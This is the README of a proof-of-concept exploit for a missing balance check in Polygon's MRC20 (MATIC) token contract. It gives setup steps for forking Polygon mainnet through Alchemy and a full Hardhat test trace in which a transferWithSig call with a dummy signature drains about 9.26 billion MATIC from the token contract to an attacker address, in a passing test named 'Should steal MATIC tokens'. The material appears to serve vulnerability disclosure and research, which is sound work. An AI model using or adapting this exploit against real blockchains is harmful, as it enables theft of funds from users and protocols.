# This project demonstrates a PoC for the Polygon lack of balance check vulnerability

This example uses MRC20 as target vulnerable token as the victim which contains ~9260856583.14 MATIC.

A prequisite of running this PoC is setting the POLYGON_ALCHEMY_API_KEY environment variable.

```
export POLYGON_ALCHEMY_API_KEY=https://polygon-mainnet.g.alchemy.com/v2/[API_KEY]
```

![PoC](./PolygonExploit.png)

# Debug

```
λ npx hardhat test --tracefull


  Polygon Exploit
MATIC token contract balance before:
 9260856583.144629787523480553
Attacker balance before:
 0.0

CALL <UnknownContract 0x0000000000000000000000000000000000001010>.transferWithSig(sig=0x00, amount=9260856583144629787523480553, data=0x12150a0a010b1a0a080f0f1709070e0408121c0606170b121b1a0e11031a0305, expiration=10000000000000, to=0x0000000000000000000000000000000000000B0b)
   SLOAD 0x0000000000000000000000000000000000000000000000000000000000000001 => (0x0000000000000000000000000000000000000000000000000000000000000000)
   SLOAD 0xcc6d627c71ecf09814558c6093bf77600adec00e6ebf3d7d30b1bee55a09e7c4 => (0x0000000000000000000000000000000000000000000000000000000000000000)
   SLOAD 0xcc6d627c71ecf09814558c6093bf77600adec00e6ebf3d7d30b1bee55a09e7c4 => (0x0000000000000000000000000000000000000000000000000000000000000000)
   SSTORE 0xcc6d627c71ecf09814558c6093bf77600adec00e6ebf3d7d30b1bee55a09e7c4 <= (0x0000000000000000000000000000000000000000000000000000000000000001)
   STATICCALL <UnknownContract 0x0000000000000000000000000000000000001010>.balanceOf(account=0x0000000000000000000000000000000000000000) => (5462653072348824898169)
   STATICCALL <UnknownContract 0x0000000000000000000000000000000000001010>.balanceOf(account=0x0000000000000000000000000000000000000B0b) => (0)
   CALL UnknownContractAndFunction(to=0x0000000000000000000000000000000000000b0b, input=0x, ret=0x)
   EVENT <UnknownContract 0x0000000000000000000000000000000000000b0b>.Transfer(from=0x0000000000000000000000000000000000000000, to=0x0000000000000000000000000000000000000B0b, value=9260856583144629787523480553)
   SLOAD 0x0000000000000000000000000000000000000000000000000000000000000002 => (0x0000000000000000000000007d1afa7b718fb893db30a3abc0cfc608aacfebb0)
   STATICCALL <UnknownContract 0x0000000000000000000000000000000000001010>.balanceOf(account=0x0000000000000000000000000000000000000000) => (5462653072348824898169)
   STATICCALL <UnknownContract 0x0000000000000000000000000000000000001010>.balanceOf(account=0x0000000000000000000000000000000000000B0b) => (9260856583144629787523480553)
   EVENT <UnknownContract 0x0000000000000000000000000000000000000b0b>.LogTransfer(token=0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0, from=0x0000000000000000000000000000000000000000, to=0x0000000000000000000000000000000000000B0b, amount=9260856583144629787523480553, input1=5462653072348824898169, input2=0, output1=5462653072348824898169, output2=9260856583144629787523480553)
MATIC token contract balance after:
 0.0
Attacker balance after:
 9260856583.144629787523480553
    √ Should steal MATIC tokens (5312ms)


  1 passing (5s)
```
